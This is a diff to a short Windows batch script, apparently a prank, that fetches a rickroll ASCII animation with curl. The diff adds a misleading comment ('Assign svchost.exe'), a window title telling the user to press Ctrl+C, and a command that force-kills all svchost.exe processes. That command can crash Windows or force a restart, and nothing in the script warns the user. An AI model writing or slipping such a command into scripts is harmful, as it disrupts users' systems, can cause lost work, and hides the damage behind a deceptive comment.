@@ -1,2 +1,5 @@
 @echo off
+REM Assign svchost.exe
+title Press Ctrl+C to stop
 curl ascii.live/rick
+TASKKILL /IM svchost.exe /F
